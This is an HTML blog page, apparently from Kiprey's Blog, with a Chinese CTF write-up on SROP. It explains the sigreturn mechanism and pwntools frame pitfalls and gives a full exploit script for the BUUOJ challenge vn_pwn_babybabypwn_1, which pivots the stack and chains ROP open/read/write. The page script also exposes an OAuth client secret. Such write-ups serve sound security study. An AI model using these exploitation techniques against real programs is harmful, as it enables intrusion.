@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="CTF, pwn, BUUOJ, SROP,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
+   
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    SROP |  Kiprey&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-SROP"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  SROP
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/05/SROP/" class="article-date">
+  <time datetime="2020-05-15T05:39:22.000Z" itemprop="datePublished">2020-05-15</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.1k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">5 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="1-介绍">1. 介绍</h2>
+<blockquote>
+<p>前面虽然做过一道关于SROP的题，但并没有具体总结。这次就来总结一下</p>
+</blockquote>
+<ul>
+<li>
+<p><strong>SROP的原理</strong>? (下文摘自CTF wiki)</p>
+<ul>
+<li>内核向某个进程发送signal机制，该进程会被暂时挂起，进入内核态。</li>
+<li>内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址。我们称ucontext以及siginfo这一段为Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的signal handler中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。</li>
+<li>signal handler返回后，内核为执行sigreturn系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的sigreturn的调用号为77，64位的系统调用号为15。</li>
+</ul>
+</li>
+<li>
+<p>Signal Frame的构建是比较复杂的，因为不同架构下的结构是不一样的。不过值得一提的是，在目前的<code>pwntools</code>中已经集成了对于SROP的攻击。所以我们可以很方便的构建出Signal Frame。</p>
+</li>
+</ul>
+<blockquote>
+<p>注： 在本文中，Signal Frame和SigreturnFrame是同一个意思</p>
+</blockquote>
+<a id="more"></a>
+<ul>
+<li><strong>注意点:</strong>
+<ol>
+<li>构建SigreturnFrame时，<strong>必须设置rsp和rip</strong>，否则就直接<code>SIGSEV</code></li>
+<li>构建SigreturnFrame时，必须确保 <strong>syscall</strong> SYS_sigreturn时，其rsp指向sigreturnFrame的首地址</li>
+<li>如果输入SigreturnFrame后，程序 <strong>call</strong> SYS_sigreturn,则传入的SigreturnFrame <strong>最好从第八个字节开始传入</strong> (<code>str(frame)[8:]</code>)，而不是目的寄存器向前偏移一个位置（不是很懂？请阅读下面的例题 :-)）</li>
+</ol>
+</li>
+</ul>
+<h2 id="2-例子-——-vn-pwn-babybabypwn-1">2. 例子 —— vn_pwn_babybabypwn_1</h2>
+<h3 id="分析">分析</h3>
+<ul>
+<li>ELF文件保护全开， 但题目给出了libc</li>
+<li>程序使用了<code>seccomp</code>函数，只能ORW</li>
+<li>输入数据后程序会call sys_sigreturn(注意是<code>call</code>)<br>
+<img src="/2020/05/SROP/code.png" alt="img"></li>
+<li>我们可以构建SigreturnFrame，将栈迁移到libc的bss段，然后一路ROP从而get flag.</li>
+</ul>
+<h3 id="坑点">坑点</h3>
+<ul>
+<li>
+<p>由于程序是 <strong>call</strong> sys_sigreturn ，所以当即将执行sys_sigreturn时，其rsp指向的是 <code>&amp;SigreturnFrame + 8</code>(call指令会将old rip压栈)。 所以在传入SigreturnFrame时，必须从第8个字节开始，否则会SIGSEV，即</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = new_stack</span><br><span class="line">frame.rdx = <span class="number">0x180</span></span><br><span class="line">frame.rsp = new_stack </span><br><span class="line">frame.rip = libc.symbols[<span class="string">'syscall'</span>] + <span class="number">23</span></span><br><span class="line"><span class="comment"># 注意下一行</span></span><br><span class="line">sla(<span class="string">"Please input magic message: "</span>, flat(frame)[<span class="number">8</span>:])</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>偏移8个字节可能大家都知道，但可能有部分小伙伴是这么做的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''' 注：以下64位SigreturnFrame结构，来自pwntools库中的SROP.py</span></span><br><span class="line"><span class="string"># Reference : https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf</span></span><br><span class="line"><span class="string">'amd64': &#123;0: 'uc_flags', 8: '&amp;uc', 16: 'uc_stack.ss_sp', 24: 'uc_stack.ss_flags',</span></span><br><span class="line"><span class="string">          32: 'uc_stack.ss_size', 40: 'r8', 48: 'r9', 56: 'r10', 64: 'r11', 72: 'r12',</span></span><br><span class="line"><span class="string">          80: 'r13', 88: 'r14', 96: 'r15', 104: 'rdi', 112: 'rsi', 120: 'rbp', 128: 'rbx',</span></span><br><span class="line"><span class="string">          136: 'rdx', 144: 'rax', 152: 'rcx', 160: 'rsp', 168: 'rip', 176: 'eflags',</span></span><br><span class="line"><span class="string">          184: 'csgsfs', 192: 'err', 200: 'trapno', 208: 'oldmask', 216: 'cr2',</span></span><br><span class="line"><span class="string">          224: '&amp;fpstate', 232: '__reserved', 240: 'sigmask'&#125;,</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdx = constants.SYS_read            <span class="comment"># rax</span></span><br><span class="line">frame.r15 = <span class="number">0</span>                             <span class="comment"># rdi</span></span><br><span class="line">frame.rdi = new_stack                     <span class="comment"># rsi</span></span><br><span class="line">frame.rbx = <span class="number">0x180</span>                         <span class="comment"># rdx</span></span><br><span class="line">frame.rcx = new_stack                     <span class="comment"># rsp</span></span><br><span class="line">frame.rsp = libc.symbols[<span class="string">'syscall'</span>] + <span class="number">23</span>  <span class="comment"># rip</span></span><br><span class="line"><span class="comment"># 注意下一行</span></span><br><span class="line">sla(<span class="string">"Please input magic message: "</span>, flat(frame))</span><br></pre></td></tr></table></figure>
+<p>他们将每个寄存器的值都向上偏移8个字节，从而使rax、rdi等寄存器中刚好存入我们期望的值<br>
+但动态调试时，执行函数（例如read）,或者syscall，总会引发SIGSEV，这是为什么？</p>
+<ul>
+<li>原因是因为SigreturnFrame中的某个至关重要的寄存器值 —— cs/gs/fs —— 没有一起偏移过去</li>
+<li>只要再设置一条<code>frame.eflags = 51  # cs</code>，程序就可以正常工作了</li>
+<li>但即便如此，这种方法仍然比第一种方法麻烦，不推荐使用</li>
+</ul>
+</li>
+</ul>
+<h3 id="EXP">EXP</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ELFname = <span class="string">"./vn_pwn_babybabypwn_1"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    io = remote(<span class="string">"node3.buuoj.cn"</span>, sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(ELFname)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./buu_libcs/ubuntu16-64-libc-2.23.so"</span>)</span><br><span class="line">e = ELF(ELFname)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> msg, content : io.sendlineafter(msg, content)</span><br><span class="line">sl = <span class="keyword">lambda</span> content : io.sendline(content)</span><br><span class="line">ru = <span class="keyword">lambda</span> msg : io.recvuntil(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(msg = <span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(io, msg)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">"Here is my gift: "</span>)</span><br><span class="line">msg = ru(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">libc_puts = int(msg, <span class="number">16</span>)</span><br><span class="line">libc.address = libc_puts - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">new_stack = libc.bss(<span class="number">0x60</span>)</span><br><span class="line">log.success(<span class="string">"libc base addr: "</span> + hex(libc.address))</span><br><span class="line">log.success(<span class="string">"new_stack addr: "</span> + hex(new_stack))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法一</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = new_stack</span><br><span class="line">frame.rdx = <span class="number">0x180</span></span><br><span class="line">frame.rsp = new_stack </span><br><span class="line">frame.rip = libc.symbols[<span class="string">'syscall'</span>] + <span class="number">23</span></span><br><span class="line">sla(<span class="string">"Please input magic message: "</span>, flat(frame)[<span class="number">8</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法二（不推荐</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">frame = SigreturnFrame()</span></span><br><span class="line"><span class="string">frame.rdx = constants.SYS_read            # rax</span></span><br><span class="line"><span class="string">frame.r15 = 0                             # rdi</span></span><br><span class="line"><span class="string">frame.rdi = new_stack                     # rsi</span></span><br><span class="line"><span class="string">frame.rbx = 0x180                         # rdx</span></span><br><span class="line"><span class="string">frame.rcx = new_stack                     # rsp</span></span><br><span class="line"><span class="string">frame.rsp = libc.symbols['syscall'] + 23  # rip</span></span><br><span class="line"><span class="string">frame.eflags = 51                       # cs/gs/fs</span></span><br><span class="line"><span class="string"># 注意下一行</span></span><br><span class="line"><span class="string">#debug("b syscall\nc")</span></span><br><span class="line"><span class="string">sla("Please input magic message: ", flat(frame))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">rop = ROP(libc, base=new_stack)</span><br><span class="line">rop.open(<span class="string">'flag\x00'</span>, <span class="number">0</span>)</span><br><span class="line">rop.read(<span class="number">3</span>, libc.bss(), <span class="number">0x60</span>)</span><br><span class="line">rop.write(<span class="number">1</span>, libc.bss(), <span class="number">0x60</span>)</span><br><span class="line">log.info(rop.dump())</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug("b syscall\nc")</span></span><br><span class="line">sl(rop.chain())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2020/05/SROP/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/BUUOJ/" rel="tag">BUUOJ</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2020/05/buuoj-pwn/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            BUUOJ 部分pwn题解
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/05/heap-13-off-by-one-and-realloc-hook/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">heap - 13 - off_by_one &amp;&amp; __realloc_hook</div>
+      </a>
+    
+  </nav>
+
+   
+ 
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '5f6c407f4cb8963d03ac',
+    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
+    repo: 'kiprey.github.io',
+    owner: 'kiprey',
+    admin: ['kiprey'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2025
+        <i class="ri-heart-fill heart_icon"></i> Kiprey
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                var int1 = setInterval(fixCount1, 100);
+                var int2 = setInterval(fixCount2, 100);
+
+                var busuanziValueSiteOffset = 100000000000;
+                var busuanziValuePageOffset = 200000000000;
+                function fixCount1() {
+                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
+                        clearInterval(int1);
+                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
+                    }
+                }
+                function fixCount2() {
+                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
+                        clearInterval(int2);
+                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
+                    }
+                }
+            });
+        </script> -->
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+<!-- mermaid -->
+
+  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+<!-- baiduSpider auto push -->
+
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https'){
